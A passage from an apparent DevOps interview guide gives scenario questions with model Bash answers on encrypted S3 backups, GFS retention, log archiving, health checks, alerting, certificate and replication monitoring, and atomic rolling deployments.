**Why →** Incremental transfer cuts nightly volume to the daily change rate, and snapshots keep restores simple.

**Interview tip →** Mention that `aws s3 sync` compares size and modification time, not content, which matters for files rewritten with the same size.

</details>

### Q30. Compliance requires backups to be encrypted before they leave the server. How do you change the script? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Server-side encryption protects data at rest in S3, but client-side encryption means the cloud provider never sees plaintext.

**What I'd do →**
1. Encrypt with a public key so the server cannot decrypt its own backups:
   ```bash
   tar -czf - -C / etc srv/app | age -r "$AGE_PUBKEY" > "$out.tar.gz.age"
   # or: gpg --batch --encrypt --recipient backup@example.com --output "$out.gpg" "$out"
   ```
2. Keep the private key offline or in a secrets manager with restricted access, and test decryption in restore drills.
3. Still use `--sse aws:kms` on upload as defence in depth, and an IAM policy that only allows `s3:PutObject` for the server.
4. Use `set -o pipefail` so a tar failure is not hidden behind a successful encryption step.

**Why →** Public-key encryption means a compromised server cannot read historical backups.

**Interview tip →** Mention that losing the key means losing every backup, so key management is part of the design.

</details>

### Q31. Fifty servers back up to one S3 bucket. How do you structure keys and permissions? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need clear ownership, isolation between servers, and protection against a compromised server deleting all backups.

**What I'd do →**
1. Key layout: `servers/<hostname>/<hostname>-<UTC timestamp>.tar.gz`, so listing and lifecycle rules work per host.
2. Instance role permissions: `s3:PutObject` (and `s3:GetObject` for verification if needed) on `arn:aws:s3:::bucket/servers/${aws:PrincipalTag/Name}/*` or a per-host prefix; no `s3:DeleteObject`.
3. Bucket: versioning, default encryption, Block Public Access, lifecycle expiration, and Object Lock in governance or compliance mode for ransomware resistance.
4. Monitoring: a scheduled check that every host has an object newer than 26 hours.

**Why →** Put-only permissions plus versioning means a compromised host can add objects but cannot destroy history.

**Interview tip →** Mention "freshness monitoring per host"; a host that silently stopped backing up is the common failure.

</details>

### Q32. Implement retention of 7 daily, 4 weekly and 12 monthly backups (GFS) in a script. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Classify each backup by date, keep the newest in each bucket, delete the rest.

**What I'd do →**
```bash
declare -A keep=()
mapfile -t files < <(find "$dir" -maxdepth 1 -name "$host-*.tar.gz" -printf '%f\n' | sort -r)
daily=0; declare -A seen_w seen_m
for f in "${files[@]}"; do
  d=${f#"$host-"}; d=${d:0:8}                          # YYYYMMDD from the name
  if (( daily < 7 )); then keep[$f]=1; daily=$((daily + 1)); fi
  w=$(date -d "$d" +%G-W%V); m=${d:0:6}
  if [[ -z ${seen_w[$w]:-} ]] && (( ${#seen_w[@]} < 4 )); then seen_w[$w]=1; keep[$f]=1; fi
  if [[ -z ${seen_m[$m]:-} ]] && (( ${#seen_m[@]} < 12 )); then seen_m[$m]=1; keep[$f]=1; fi
done
for f in "${files[@]}"; do [[ -n ${keep[$f]:-} ]] || rm -f -- "$dir/$f" "$dir/$f.sha256"; done
```
1. Files are processed newest first, so the first file seen in each week or month is the newest one.
2. Run it with a `--dry-run` that prints decisions before enabling deletion.

**Why →** GFS gives fine recent granularity and long history with few files.

**Interview tip →** Mention that for S3, tools like restic (`forget --keep-daily 7 --keep-weekly 4 --keep-monthly 12`) or lifecycle tiers do this without custom code.

</details>

### Q33. Archive application logs older than 30 days to S3 Glacier and remove them locally. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Upload first, verify, then delete; never delete on a failed upload.

**What I'd do →**
```bash
find /var/log/app -type f -name '*.gz' -mtime +30 -print0 |
while IFS= read -r -d '' f; do
  key="logs/$(hostname -s)/${f#/var/log/app/}"
  if aws s3 cp --only-show-errors --storage-class GLACIER_IR -- "$f" "s3://$BUCKET/$key"; then
    rm -f -- "$f"
  else
    echo "upload failed, keeping $f" >&2
  fi
done
```
1. `GLACIER_IR` (Instant Retrieval) or `DEEP_ARCHIVE` depending on retrieval needs and cost.
2. Better: upload to `STANDARD` and let a lifecycle rule transition objects, which keeps the script simple.

**Why →** The `if upload; then delete` ordering makes data loss impossible on network errors.

**Interview tip →** Mention retrieval costs and delays for Glacier classes, because cheap storage is not cheap restores.

</details>

### Q34. The backup job slows down the production database server during business hours. How do you reduce its impact? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The job competes for CPU, disk I/O and network.

**What I'd do →**
1. Schedule it off-peak with a systemd timer: `OnCalendar=*-*-* 02:30:00 UTC`.
2. Lower priority: `nice -n 15 ionice -c3 tar ...`, or in the unit `Nice=15`, `IOSchedulingClass=idle`, `CPUQuota=30%`.
3. Limit bandwidth: `aws configure set default.s3.max_bandwidth 50MB/s`, `rsync --bwlimit`.
4. Back up from a replica instead of the primary when possible.
5. Use faster compression (`zstd -T2 -3`) to reduce CPU time.

**Why →** Priority and bandwidth limits let the job use spare capacity without starving production.

**Interview tip →** Mention that `ionice -c3` (idle) only helps with I/O schedulers that honour it (BFQ); with `none`/`mq-deadline` on NVMe, cgroup I/O limits are more reliable.

</details>

### Q35. How do you verify that a file uploaded to S3 is intact? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Network errors and partial uploads must be detected before you delete the local copy.

**What I'd do →**
1. Compare the size after upload:
   ```bash
   local_size=$(stat -c %s "$f")
   remote_size=$(aws s3api head-object --bucket "$B" --key "$K" --query ContentLength --output text)
   [[ $local_size == "$remote_size" ]] || die "size mismatch"
   ```
2. Upload a SHA-256 checksum alongside, or use S3's checksum support: `aws s3api put-object --checksum-algorithm SHA256 ...` and read it back with `head-object --checksum-mode ENABLED`.
3. During restore tests, download and run `sha256sum -c`.

**Why →** The CLI already retries and validates parts, but an explicit check gives evidence in logs and catches logic errors such as uploading the wrong file.

**Interview tip →** Mention that the ETag equals the MD5 only for single-part, non-KMS uploads, so do not rely on it as a checksum.

</details>

### Q36. An app writes `app-YYYY-MM-DD.log` files daily. There is no logrotate. Write the housekeeping. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compress yesterday's and older files, delete old compressed files, and never touch today's file.

**What I'd do →**
```bash
dir=/var/log/app
today="app-$(date +%F).log"
find "$dir" -maxdepth 1 -type f -name 'app-*.log' ! -name "$today" -mmin +60 -exec gzip -9 -- {} +
find "$dir" -maxdepth 1 -type f -name 'app-*.log.gz' -mtime +30 -delete
```
1. `! -name "$today"` and `-mmin +60` protect the active file.
2. Schedule daily at 00:15 via a timer.

**Why →** Date-named files need no rename or signal; compression and deletion by age are enough.

**Interview tip →** Mention that logrotate can still do this with `dateext` patterns, but a two-line `find` is often clearer.

</details>

### Q37. Back up every MySQL database separately, skipping system schemas. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separate dumps allow restoring one database without the others.

**What I'd do →**
```bash
set -Eeuo pipefail
mapfile -t dbs < <(mysql --defaults-extra-file=/etc/mysql/backup.cnf -NBe 'SHOW DATABASES' |
  grep -Ev '^(information_schema|performance_schema|mysql|sys)$')
for db in "${dbs[@]}"; do
  mysqldump --defaults-extra-file=/etc/mysql/backup.cnf --single-transaction --routines --triggers -- "$db" |
    gzip > "/var/backups/mysql/${db}-$(date -u +%Y%m%dT%H%M%SZ).sql.gz"
done
```
1. Credentials in a `0600` option file, not on the command line.
2. `--single-transaction` gives a consistent snapshot for InnoDB without locking tables.
3. `-NB` gives raw output without headers or boxes.

**Why →** Per-database dumps make partial restores fast, and `pipefail` catches a failing `mysqldump`.

**Interview tip →** Mention that logical dumps are slow for very large databases; physical tools (Percona XtraBackup) or managed snapshots fit better there.

</details>

### Q38. A backup job sometimes runs twice at the same time and the archives are corrupted. How do you prevent it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A slow run overlaps with the next scheduled one, or someone ran it manually during the scheduled run.

**What I'd do →**
1. Take an exclusive lock at the top of the script:
   ```bash
   exec 9>/run/lock/backup.lock
   flock -n 9 || { echo "backup already running, skipping" >&2; exit 0; }
   ```
2. Write to unique temp names and `mv` into place, so even an unexpected overlap cannot interleave writes.
3. If migrating to systemd timers, systemd will not start a service that is already running.

**Why →** `flock` locks are released by the kernel when the process dies, so there are no stale lock files after a crash.

**Interview tip →** Explain why PID files are worse: they go stale after `kill -9`, and PIDs get reused.

</details>

### Q39. You need to tar a directory that the application writes to constantly. `tar` keeps exiting with 1. How do you handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** GNU tar exits 1 when a file changed while it was being read; exit 2 is a fatal error. Under `set -e`, exit 1 aborts the backup.

**What I'd do →**
1. Treat 1 as a warning, above 1 as failure:
   ```bash
   rc=0
   tar --warning=no-file-changed -czf "$tmp" -C / srv/app/data || rc=$?
   (( rc <= 1 )) || die "tar failed with $rc"
   (( rc == 1 )) && log WARN "files changed during backup"
   ```
2. For consistency, snapshot first: LVM or ZFS snapshot, EBS snapshot, or the application's own backup command (databases must never be backed up by copying live files).
3. Or pause writes briefly (maintenance mode) for small datasets.

**Why →** A file that changes mid-read may be inconsistent; for logs that is fine, for database files it is corruption.

**Interview tip →** Mention snapshots as the real fix for consistency, not tar flags.

</details>

### Q40. Clean up files older than two days in `/tmp/app-cache`, owned by `app`, where filenames may contain spaces and newlines. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Let `find` select and delete; no parsing of names is needed.

**What I'd do →**
```bash
find /tmp/app-cache -xdev -type f -user app -mtime +2 -print -delete
find /tmp/app-cache -xdev -mindepth 1 -type d -empty -delete
```
1. `-xdev` stays on one filesystem; `-print` logs what was deleted.
2. `-delete` handles any filename because no shell or `xargs` splitting is involved.
3. Alternatively, declare it with systemd-tmpfiles: `d /tmp/app-cache 0750 app app 2d` in `/etc/tmpfiles.d/app.conf`.

**Why →** The safest way to handle weird filenames is to never turn them into text.

**Interview tip →** Mention systemd-tmpfiles; many teams forget it exists and write cron jobs instead.

</details>

## Scenarios: health checks, monitoring and alerts

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q41. You are asked for a host health-check script covering disk, memory, systemd services and an HTTP endpoint. How do you design it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** It must be fast, never hang, report every check (not stop at the first failure), and return a machine-readable result.

**What I'd do →**
1. One function per check, each calling `record STATUS CHECK TARGET DETAIL` that appends to an array and tracks the worst status.
2. Disk from `df -P -x tmpfs -x devtmpfs`, memory from `MemAvailable` in `/proc/meminfo`, services with `systemctl is-active`, HTTP with `curl -sS -o /dev/null --max-time 5 -w '%{http_code}'`.
3. Warning and critical thresholds from a config file, overridable by environment.
4. Exit with Nagios-style codes (0 OK, 1 WARNING, 2 CRITICAL, 3 UNKNOWN), so monitoring systems and systemd can consume it.
5. Do not use `set -e` to abort on the first failed check; capture each result instead.
6. Alert per failing check with a dedupe key, and send a "resolved" when it recovers.

**Why →** A health check that dies on the first problem hides the second one, and one that hangs is worse than none.

**Interview tip →** The [hands-on lab](./hands-on-lab.md) builds exactly this, with tests. Walk through its exit codes.

</details>

### Q42. Your disk alert fires and clears every few minutes around 80%, spamming Slack. How do you fix the alerting? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The value oscillates around a single threshold and every check sends a message: no deduplication, no hysteresis.

**What I'd do →**
1. **Deduplicate:** store a state file per alert key (`alerts/disk-var`) with the time it fired; suppress repeats within a cooldown (for example, 1 hour).
2. **Hysteresis:** fire at 85%, clear only below 80%.
   ```bash
   firing=$([[ -e $state ]] && echo 1 || echo 0)
   if (( pct >= 85 )) || (( firing && pct >= 80 )); then alert; elif (( firing )); then resolve; fi
   ```
3. **Duration:** require N consecutive bad checks before alerting (keep a counter in the state file).
4. Send **resolved** messages so people know when to stop looking.
5. Separate warning (ticket or channel) from critical (page).

**Why →** Alert fatigue makes people mute channels, and then the real alert is missed.

**Interview tip →** Use the word "hysteresis". It is what Prometheus `for:` clauses and Alertmanager grouping solve in larger setups.

</details>

### Q43. A server reports `No space left on device` but `df -h` shows 40% free. What would you add to the health checks? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The filesystem has run out of inodes, usually from millions of tiny files (sessions, cache, mail queue).

**What I'd do →**
1. Confirm: `df -i`.
2. Find the directory: `find / -xdev -type d -size +1M 2>/dev/null` (huge directories) or count files per directory with `du --inodes -x -d 2 / | sort -n | tail`.
3. Add an inode check next to the disk check:
   ```bash
   df -Pi -x tmpfs -x devtmpfs | awk -v t=90 'NR > 1 && $5 != "-" {sub(/%/, "", $5); if ($5+0 >= t) print $6, $5"%"}'
   ```
4. Fix the source: session cleanup, cache TTLs, tmpfiles rules.

**Why →** Inode exhaustion fails writes exactly like a full disk but is invisible to `df -h`.

**Interview tip →** Mention XFS allocates inodes dynamically while ext4 fixes the count at mkfs time, which is why this hits ext4 more.

</details>

### Q44. Alert when any certificate under `/etc/letsencrypt/live` expires within 21 days. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `openssl x509 -checkend` does the date math and returns a clean exit code.

**What I'd do →**
```bash
rc=0
for cert in /etc/letsencrypt/live/*/fullchain.pem; do
  [[ -e $cert ]] || continue
  if ! openssl x509 -checkend $((21 * 86400)) -noout -in "$cert" >/dev/null; then
    end=$(openssl x509 -enddate -noout -in "$cert" | cut -d= -f2)
    echo "CRIT ${cert%/fullchain.pem}: expires $end"
    rc=2
  fi
done
exit "$rc"
```
1. `-checkend N` exits 1 if the cert expires within N seconds.
2. Also check what the server actually serves (`openssl s_client -connect host:443 -servername host`), since a renewed file is useless if nginx was never reloaded.

**Why →** Expired certificates cause total outages and are 100% predictable.

**Interview tip →** Mention checking the served certificate, not only the file; renewal without reload is a common miss.

</details>

### Q45. A developer wrote a Bash loop that restarts the app whenever its process disappears. What do you suggest instead? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A watchdog loop is a fragile supervisor: it can die itself, misses fast crash loops, and has no backoff or logging.

**What I'd do →**
1. Run the app as a systemd service with restart policy:
   ```ini
   [Service]
   ExecStart=/srv/app/current/bin/server
   Restart=on-failure
   RestartSec=5
   StartLimitIntervalSec=300
   StartLimitBurst=5
   ```
2. Add `WatchdogSec=` if the app can send `sd_notify` heartbeats, which catches hangs, not just exits.
3. Alert via `OnFailure=` when the start limit is hit.
4. In Kubernetes, the equivalent is liveness probes and the restart policy.

**Why →** The init system already supervises processes reliably, with logging and rate limiting.

**Interview tip →** Say "don't write a supervisor in Bash" and name the systemd directives.

</details>

### Q46. You suspect a memory leak in a service. How do you collect evidence with a script before involving developers? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need a time series of the process's memory to show a monotonic increase, plus restarts.

**What I'd do →**
1. Sample every minute from a timer, appending CSV:
   ```bash
   pid=$(systemctl show -p MainPID --value app)
   rss=$(awk '/^VmRSS:/ {print $2}' "/proc/$pid/status")
   cg=$(cat "/sys/fs/cgroup/system.slice/app.service/memory.current")
   printf '%s,%s,%s,%s\n' "$(date -u +%FT%TZ)" "$pid" "$rss" "$cg" >> /var/lib/memwatch/app.csv
   ```
2. Track the cgroup's `memory.current` too: it includes child processes and page cache charged to the service.
3. Summarize growth per hour with `awk`, and correlate with PID changes (restarts) and deploy times.
4. Alert if growth exceeds a slope (for example 50 MB per hour sustained for 6 hours).

**Why →** A graph of steady growth across restarts is the evidence developers need; a single `free -m` snapshot is not.

**Interview tip →** Mention that `MemoryMax=` in the unit turns a leak into a contained restart instead of a host OOM.

</details>

### Q47. How do you know a scheduled job actually ran, not just that it did not report failure? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Failure alerts do not fire if the job never starts (timer disabled, host down, cron syntax error).

**What I'd do →**
1. Add a dead man's switch: the job pings a heartbeat URL on success (Healthchecks.io, Cronitor, or an internal endpoint), and the monitor alerts when pings stop:
   ```bash
   trap 'curl -fsS -m 10 --retry 3 "$HEARTBEAT_URL/fail" >/dev/null || true' ERR
   ...
   curl -fsS -m 10 --retry 3 "$HEARTBEAT_URL" >/dev/null || true
   ```
2. Or check freshness of the job's output: newest backup in S3 younger than 26 hours.
3. Export a "last success" timestamp metric (node_exporter textfile collector) and alert on `time() - last_success > 90000`.

**Why →** Monitoring absence of success catches every failure mode, including ones you did not think of.

**Interview tip →** Say "alert on missing success, not only on reported failure".

</details>

### Q48. An endpoint returns HTTP 200 even when the app is degraded; the JSON body has `"status": "degraded"`. How do you check it in a script? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The status code is not enough; parse the body.

**What I'd do →**
```bash
body=$(curl -fsS --max-time 5 http://127.0.0.1:8080/health) || { echo "CRIT unreachable"; exit 2; }
status=$(jq -r '.status // "unknown"' <<<"$body")
case $status in
  ok)       echo "OK";              exit 0 ;;
  degraded) echo "WARN degraded: $(jq -c '.checks' <<<"$body")"; exit 1 ;;
  *)        echo "CRIT status=$status"; exit 2 ;;
esac
```
1. `curl -f` turns HTTP 4xx and 5xx into a non-zero exit.
2. The `// "unknown"` default handles a missing field.

**Why →** Health semantics live in the body for many apps; ignoring it gives false greens.

**Interview tip →** Mention timeouts on every probe; a hanging health check blocks the next one.

</details>

### Q49. You need to alert if "Out of memory" appears more than 50 times in 5 minutes in an app log, without a logging stack. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Count matches in a time window. Using the journal or a byte offset avoids rescanning the whole file.

**What I'd do →**
1. If the app logs to journald:
   ```bash
   n=$(journalctl -u app --since '5 min ago' --no-pager -o cat | grep -c 'Out of memory' || true)
   (( n > 50 )) && opskit-alert -s critical -k app-oom -t "app OOM errors" "$n in 5 minutes"
   ```
2. For a file, remember the last byte offset in a state file and read only new data with `tail -c +$((offset + 1))`, resetting if the file shrank (rotation).
3. Run it every 5 minutes from a timer.

**Why →** Windowed counts give rate-based alerts without Loki or Elasticsearch.

**Interview tip →** Mention handling rotation (file shrank or inode changed), which is where homemade log watchers break.

</details>

### Q50. Security wants an alert if a server listens on any port not in an approved list. Write it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compare the current listening sockets against an allow-list.

**What I'd do →**
```bash
allowed=(22 80 443 9100)
mapfile -t listening < <(ss -Htlnu | awk '{print $5}' | sed -E 's/.*:([0-9]+)$/\1/' | sort -un)
unexpected=$(comm -13 <(printf '%s\n' "${allowed[@]}" | sort -u) <(printf '%s\n' "${listening[@]}"))
if [[ -n $unexpected ]]; then
  echo "CRIT unexpected listening ports: $(paste -sd, <<<"$unexpected")"
  ss -Htlnup | grep -E ":($(paste -sd'|' <<<"$unexpected"))\b"
  exit 2
fi
```
1. `ss -H` drops the header, `-p` (as root) shows the owning process for the report.
2. `comm -13` prints lines only in the second (current) list.

**Why →** An unexpected listener is either drift or compromise; both deserve attention.

**Interview tip →** Mention that `comm` needs both inputs sorted the same way.

</details>

### Q51. Alert when any systemd unit on a host is in a failed state. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** systemd already tracks failed units; just query it.

**What I'd do →**
```bash
mapfile -t failed < <(systemctl list-units --state=failed --no-legend --plain | awk '{print $1}')
if (( ${#failed[@]} )); then
  echo "CRIT failed units: ${failed[*]}"
  for u in "${failed[@]}"; do journalctl -u "$u" -n 5 --no-pager; done
  exit 2
fi
echo "OK no failed units"
```
1. `systemctl is-system-running` returns `degraded` when any unit failed, a quick one-word check.
2. After fixing, `systemctl reset-failed` clears the state.

**Why →** Failed oneshot units (backups, cert renewals) are easy to miss because nothing restarts them.

**Interview tip →** Mention `systemctl is-system-running` for a single status word.

</details>

### Q52. How do you check load average sensibly in a script? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A load of 8 is idle on a 32-core box and overloaded on a 2-core box; compare to CPU count.

**What I'd do →**
```bash
read -r l1 l5 _ < /proc/loadavg
cores=$(nproc)
awk -v l="$l5" -v c="$cores" 'BEGIN {r = l / c; printf "load5 per core: %.2f\n", r; exit !(r > 1.5)}' &&
  echo "WARN sustained load above 1.5 per core"
```
1. Use the 5-minute average to ignore short spikes.
2. Remember Linux load includes processes in uninterruptible I/O wait (`D` state), so high load with idle CPU points to storage or NFS.

**Why →** Normalizing per core makes one threshold work across instance sizes.

**Interview tip →** Mention the `D`-state nuance; it shows you understand what load actually measures on Linux.

</details>

### Q53. The health-check script itself started hanging, and cron has 30 copies running. What happened and how do you harden it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A check blocked forever, most likely `df` or `stat` on a hung NFS mount, or a `curl` without a timeout, and cron kept starting new copies.

**What I'd do →**
1. Find what blocks: `ps -eo pid,stat,wchan:30,cmd | grep -E 'health|df'` (state `D` on `nfs` points at the mount).
2. Bound every external call: `timeout 10 df -P`, `curl --max-time 5`, `ssh -o ConnectTimeout=5`.
3. Skip network filesystems in disk checks (`df -l` or `-x nfs -x nfs4 -x cifs`) and check them separately with a timeout.
4. Add a single-instance lock (`flock -n`) and an overall `timeout` in the scheduler (`TimeoutStartSec=` in systemd).
5. Report a hung check as UNKNOWN or CRITICAL instead of hanging.

**Why →** A monitoring script that hangs both hides problems and adds load during an incident.

**Interview tip →** Say "every external call gets a timeout" as a rule you always follow.

</details>

### Q54. You want your script's results on Grafana dashboards without running a new service. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** If node_exporter runs on the host, its textfile collector exposes metrics from `.prom` files.

**What I'd do →**
```bash
dir=/var/lib/node_exporter/textfile_collector
tmp=$(mktemp "$dir/.backup.prom.XXXXXX")
cat > "$tmp" <<EOF
# HELP opskit_backup_last_success_timestamp_seconds Last successful backup.
# TYPE opskit_backup_last_success_timestamp_seconds gauge
opskit_backup_last_success_timestamp_seconds $(date +%s)
# HELP opskit_backup_size_bytes Size of the last backup.
# TYPE opskit_backup_size_bytes gauge
opskit_backup_size_bytes $size
EOF
chmod 0644 "$tmp"
mv -f -- "$tmp" "$dir/opskit_backup.prom"
```
1. Start node_exporter with `--collector.textfile.directory=/var/lib/node_exporter/textfile_collector`.
2. Write atomically (temp file + `mv`) so the exporter never reads half a file.
3. Alert in Prometheus: `time() - opskit_backup_last_success_timestamp_seconds > 93600`.

**Why →** You reuse existing scraping, dashboards and alerting with a few lines of shell.

**Interview tip →** Mention the atomic write; partially written `.prom` files cause scrape errors.

</details>

### Q55. Alerts must go to Slack for warnings, and to PagerDuty plus Slack for critical. How do you structure that in shell? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Keep routing in one alert script; checks only state severity.

**What I'd do →**
1. A single `alert` command taking `-s severity -t title -k key message`.
2. Route by severity:
   ```bash
   case $severity in
     critical) send_slack; send_pagerduty ;;
     warning)  send_slack ;;
     info)     log only ;;
   esac
   ```
3. PagerDuty Events API v2 with a `dedup_key` equal to the alert key, so repeats update one incident and `"event_action": "resolve"` closes it.
4. Build every payload with `jq -n --arg`, use `curl --max-time 10 --retry 3`, and log delivery failures without failing the check.

**Why →** Central routing means changing escalation policy is one edit, not fifty.

**Interview tip →** Mention using the same key for dedupe in your state file and in PagerDuty's `dedup_key`.

</details>

### Q56. Write a check for Postgres replication lag on a replica. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** On a replica, compare now with the last replayed transaction timestamp.

**What I'd do →**
```bash
lag=$(psql -XtAc "select coalesce(extract(epoch from now() - pg_last_xact_replay_timestamp()), 0)::int" 2>/dev/null) ||
  { echo "CRIT cannot query replica"; exit 2; }
if   (( lag > 300 )); then echo "CRIT replication lag ${lag}s"; exit 2
elif (( lag > 60 ));  then echo "WARN replication lag ${lag}s"; exit 1
else echo "OK lag ${lag}s"; fi
```
1. `-X` ignores `~/.psqlrc`, `-tA` gives a bare value.
2. On a quiet primary, replay timestamps stop advancing even with zero lag; compare `pg_last_wal_receive_lsn()` and `pg_last_wal_replay_lsn()` too, or write a heartbeat row on the primary every minute.

**Why →** Reads from a lagging replica return stale data, which breaks business logic silently.

**Interview tip →** Mention the idle-primary false positive; it shows you have run this in production.

</details>

### Q57. Monitoring shows hundreds of zombie processes on a host. How do you detect and report them in a script? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Zombies (`Z` state) are finished children whose parent has not called `wait()`. They use no CPU or memory, only PID slots, but they point to a buggy parent.

**What I'd do →**
```bash
ps -eo stat=,ppid= | awk '$1 ~ /^Z/ {z[$2]++} END {for (p in z) print p, z[p]}' |
while read -r ppid count; do
  echo "WARN $count zombies under ppid $ppid ($(ps -o comm= -p "$ppid"))"
done
```
1. You cannot kill a zombie; fix or restart the **parent**, after which init reaps them.
2. In containers, add an init (`docker run --init`, `tini`) when the main process does not reap children.

**Why →** Reporting the parent tells you what to fix; counting zombies alone does not.

**Interview tip →** Say "kill the parent, not the zombie".

</details>

### Q58. Write a quick check that a host's clock is synchronized. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Clock skew breaks TLS, Kerberos, distributed locks, log correlation and AWS request signing (`RequestTimeTooSkewed`).

**What I'd do →**
```bash
synced=$(timedatectl show -p NTPSynchronized --value)
[[ $synced == yes ]] || { echo "CRIT clock not NTP-synchronized"; exit 2; }
if command -v chronyc >/dev/null; then
  offset=$(chronyc tracking | awk '/^System time/ {print $4}')
  awk -v o="$offset" 'BEGIN {exit !(o > 0.5)}' && { echo "WARN offset ${offset}s"; exit 1; }
fi
echo "OK clock synchronized"
```

**Why →** Time problems produce confusing errors far from the root cause.

**Interview tip →** Mention AWS's `RequestTimeTooSkewed` error as a real-world symptom.

</details>

### Q59. Instead of alerting at 90% disk, management wants a warning when `/var` will fill within 24 hours. How do you do it in shell? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need samples over time and a growth rate; a single reading cannot predict anything.

**What I'd do →**
1. Every 10 minutes, append `epoch,used_bytes,size_bytes` for `/var` to a state file, keeping the last 12 hours.
2. Compute a linear trend with `awk` (least squares over the window) and the time to full:
   ```bash
   awk -F, '{n++; sx+=$1; sy+=$2; sxy+=$1*$2; sxx+=$1*$1; size=$3; last=$2}
     END {d = n*sxx - sx*sx; if (n < 6 || d == 0) exit 3
          slope = (n*sxy - sx*sy) / d
          if (slope <= 0) {print "OK not growing"; exit 0}
          hours = (size - last) / slope / 3600
          printf "%s full in %.1f hours\n", (hours < 24 ? "CRIT" : "OK"), hours
          exit (hours < 24 ? 2 : 0)}' /var/lib/diskwatch/var.csv
   ```
3. Require enough samples and ignore negative slopes (cleanups).

**Why →** Predictive alerts give hours of warning, while a static threshold may fire at 3 AM with minutes left.

**Interview tip →** Mention that Prometheus does this natively with `predict_linear(node_filesystem_avail_bytes[6h], 24*3600) < 0`.

</details>

### Q60. A dashboard reads a JSON status file that your script writes every minute. Sometimes the dashboard shows parse errors. Fix it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The dashboard reads the file while the script is in the middle of writing it.

**What I'd do →**
```bash
out=/var/lib/opskit/status.json
tmp=$(mktemp "${out}.XXXXXX")
jq -n --arg host "$(hostname -s)" --argjson disk "$disk_pct" --arg ts "$(date -u +%FT%TZ)" \
  '{host: $host, disk_pct: $disk, updated: $ts}' > "$tmp"
chmod 0644 "$tmp"
mv -f -- "$tmp" "$out"
```
1. Write to a temp file in the same directory, then rename.
2. Build JSON with `jq` so it is always valid.

**Why →** Rename is atomic on the same filesystem; readers see the old or new file, never a partial one.

**Interview tip →** Explain that `mktemp` creates files with mode 0600, so set permissions before the `mv` if others must read it.

</details>

## Scenarios: deployments, user management and fleet operations

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q61. Write the core of a deploy script with release directories, an atomic symlink switch and rollback. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The "Capistrano layout" gives zero-downtime switching and instant rollback.

**What I'd do →**
```bash
base=/srv/app; release=$(date -u +%Y%m%dT%H%M%SZ); dir="$base/releases/$release"
mkdir -p "$dir"
tar -xzf "/tmp/app-$version.tgz" -C "$dir"
ln -sfn "$base/shared/.env" "$dir/.env"
previous=$(readlink -f "$base/current" || true)

ln -sfn "$dir" "$base/current.tmp" && mv -T "$base/current.tmp" "$base/current"   # atomic switch
sudo systemctl reload app

if ! wait_for_http http://127.0.0.1:8080/readyz 60; then
  echo "health check failed, rolling back to $previous" >&2
  ln -sfn "$previous" "$base/current.tmp" && mv -T "$base/current.tmp" "$base/current"
  sudo systemctl reload app
  exit 1
fi
```
1. `ln -sfn` alone unlinks then creates; `mv -T` of a temp link is a true atomic `rename()`.
2. Keep the last N releases for rollback (see the cleanup in Q26).

**Why →** All preparation happens off to the side; the only live change is one rename.

**Interview tip →** Explain why `mv -T` matters: without it, `mv` would move the link **into** the existing `current` directory.

</details>

### Q62. Deploy to 10 servers behind an AWS ALB one at a time, removing each from the target group during its deploy. Outline the script. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rolling deploy with traffic draining: deregister, wait for draining, deploy, health check, register, wait until healthy, next.

**What I'd do →**
```bash
for id in "${instance_ids[@]}"; do
  aws elbv2 deregister-targets --target-group-arn "$TG" --targets "Id=$id"
  aws elbv2 wait target-deregistered --target-group-arn "$TG" --targets "Id=$id"
  ip=$(aws ec2 describe-instances --instance-ids "$id" --query 'Reservations[0].Instances[0].PrivateIpAddress' --output text)
  ssh -o BatchMode=yes "deploy@$ip" "sudo /opt/deploy/deploy.sh $(printf '%q' "$version")" ||
    { echo "deploy failed on $id, stopping rollout" >&2; exit 1; }
  aws elbv2 register-targets --target-group-arn "$TG" --targets "Id=$id"
  aws elbv2 wait target-in-service --target-group-arn "$TG" --targets "Id=$id" ||
    { echo "$id never became healthy, stopping rollout" >&2; exit 1; }
done
```
1. The built-in `wait` commands poll with sensible timeouts.
2. Stop on the first failure; leave the failed instance out of the target group for investigation.
